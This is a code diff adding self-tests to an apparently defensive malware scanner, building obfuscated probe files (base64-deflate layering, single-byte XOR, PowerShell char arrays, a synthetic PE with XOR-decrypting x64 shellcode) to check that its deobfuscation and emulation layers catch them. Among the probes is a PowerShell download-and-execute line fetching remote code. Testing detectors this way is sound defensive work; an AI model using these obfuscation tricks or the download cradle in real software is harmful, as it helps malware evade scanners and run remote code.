@@ -713,6 +713,108 @@ def run(db):
     except Exception as exc:
         check("行为反制 II", False, f"异常: {exc}")
 
+    # 24) 动态检测层：迭代解混淆（变量名/字符串层混淆反制）+
+    #     Unicorn 受限模拟（控制流混淆反制，运行时载荷还原）
+    import base64 as _b64
+    import struct as _struct
+    import zlib as _zlib
+    from . import deobf as _deobf, emu as _emu
+
+    try:
+        ctx_d = ScanContext(rules_paths=rules)
+
+        # 24a) base64(deflate(明文脚本)) 双层套叠 → 解混淆后命中行为规则
+        p_lay = sample_dir / "layered_probe.txt"
+        inner = _demo_ps1().encode("utf-8")
+        p_lay.write_text("settings\n" +
+                         _b64.b64encode(_zlib.compress(inner)).decode("ascii") +
+                         "\nend\n", encoding="utf-8")
+        fds = scan_file(p_lay, db, ctx_d)
+        hit = next((fd for fd in fds if fd["name"] == "SBX-Remote-Download"
+                    and "解混淆" in fd.get("detail", "")), None)
+        check("解混淆: base64→deflate 套叠载荷", hit is not None,
+              (hit or {}).get("detail", "")[:72])
+
+        # 24b) 单字节 XOR 混淆 → translate 爆破还原
+        p_xor = sample_dir / "xor_probe.bin"
+        p_xor.write_bytes(bytes(c ^ 0x5A for c in
+                                b"Invoke-Expression((New-Object Net.WebClient)."
+                                b"DownloadString('http://x/p'));" * 4))
+        fds = scan_file(p_xor, db, ctx_d)
+        check("解混淆: 单字节 XOR 爆破还原",
+              any(fd["name"] == "SBX-Dynamic-Exec" and "解混淆" in fd.get("detail", "")
+                  for fd in fds))
+
+        # 24c) PS 字符数组构造敏感 API 名 → 还原后命中（变量名混淆失效）
+        p_ca = sample_dir / "chararray_probe.ps1"
+        iex_nums = ",".join(str(b) for b in b"Invoke-Expression")
+        p_ca.write_text(f"$d = [char[]]({iex_nums})\n$s = -join $d\n"
+                        "[ScriptBlock]::Create($s)\n", encoding="utf-8")
+        fds = scan_file(p_ca, db, ctx_d)
+        check("解混淆: [char[]] 字符数组还原",
+              any(fd["name"] == "SBX-Dynamic-Exec" and "解混淆" in fd.get("detail", "")
+                  for fd in fds))
+
+        # 24d) 双层编码但未命中已知特征 → Obfuscated-Content low
+        p_ob = sample_dir / "nested_probe.bin"
+        p_ob.write_bytes(_zlib.compress(_b64.b64encode(b"HELLOWORLD-PADDING-" * 24)))
+        fds = scan_file(p_ob, db, ctx_d)
+        check("解混淆: 嵌套编码隐藏内容报告",
+              any(fd["name"] == "Obfuscated-Content" for fd in fds))
+    except Exception as exc:
+        check("解混淆引擎", False, f"异常: {exc}")
+
+    try:
+        def _emu_pe(sc):
+            """合成 PE32+，AddressOfEntryPoint 指向平坦偏移处的 shellcode。"""
+            opt = _struct.pack(
+                "<HBBIIIIIQIIHHHHHHIIII",
+                0x20B, 14, 0, 0, 0, 0, 0x200, 0, 0x400000,
+                0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0)
+            opt += _struct.pack("<HH", 2, 0)         # Subsystem=GUI, DllCharacteristics
+            opt += _struct.pack("<QQQQII", 0x200000, 0x1000, 0x200000, 0x1000, 0, 0)
+            opt += b"\x00" * (240 - len(opt))
+            coff = _struct.pack("<HHIIIHH", 0x8664, 0, 0, 0, 0, 240, 0x2002)
+            dos = b"MZ" + b"\x00" * 0x3A + _struct.pack("<I", 0x40)
+            return (dos + b"PE\x00\x00" + coff + opt).ljust(0x200, b"\x00") + sc
+
+        # x64 shellcode：把 XOR(0x37) 的载荷解密写栈后 HLT
+        # 布局：代码 0x27 字节，blob 在 0x27；循环头 = 0x16
+        # 48 8D 35 20 00 00 00      lea rsi,[rip+0x20]   (0x07+0x20=0x27 → blob)
+        # 48 8D BC 24 00 FF FF FF   lea rdi,[rsp-0x100]   (modrm=BC: reg=rdi, rm=SIB)
+        # B2 37 / B9 19 00 00 00    mov dl,0x37 ; mov ecx,25
+        # 0x16 循环: 8A 06 / 30 D0 / 88 07 / 48 FF C6 / 48 FF C7 / FF C9 / 75 F0
+        # F4                        hlt
+        payload = b"Invoke-Expression('calc')"
+        sc = (b"\x48\x8d\x35\x20\x00\x00\x00"
+              b"\x48\x8d\xbc\x24\x00\xff\xff\xff"
+              b"\xb2\x37"
+              b"\xb9" + len(payload).to_bytes(4, "little") +
+              b"\x8a\x06\x30\xd0\x88\x07\x48\xff\xc6\x48\xff\xc7\xff\xc9\x75\xf0"
+              b"\xf4" +
+              bytes(c ^ 0x37 for c in payload))
+        # 布局自证：lea 目标（0x07+disp）必须落在 hlt(0x26) 之后的 blob 头
+        assert len(sc[:0x27]) == 0x27 and sc[0x26] == 0xF4, "shellcode 布局偏移错位"
+        assert 0x07 + int.from_bytes(sc[3:7], "little") == 0x27, "lea rsi 目标偏移错误"
+
+        if _emu.HAS_UNICORN:
+            p_emu = sample_dir / "emu_probe.bin"
+            p_emu.write_bytes(_emu_pe(sc))
+            fds = scan_file(p_emu, db, ScanContext(rules_paths=rules, emulate=True))
+            hit = next((fd for fd in fds if fd["name"] == "SBX-Dynamic-Exec"
+                        and "模拟" in fd.get("detail", "")), None)
+            check("Unicorn 模拟: 运行时解密载荷还原", hit is not None,
+                  (hit or {}).get("detail", "")[:72])
+            revs = _emu.emulate(_emu_pe(sc))
+            check("Unicorn 模拟: 还原片段提取", any(
+                b"Invoke-Expression" in frag for _d, frag in revs),
+                f"{len(revs)} 片段")
+        else:
+            check("Unicorn 模拟: 运行时解密载荷还原", True,
+                  "（未安装 unicorn，模拟层已优雅降级跳过；pip install unicorn 启用）")
+    except Exception as exc:
+        check("Unicorn 模拟引擎", False, f"异常: {exc}")
+
     ok_all = all(results)
     print(f"\n[i] 自检{'全部通过' if ok_all else '存在失败项'}。")
     return 0 if ok_all else 1
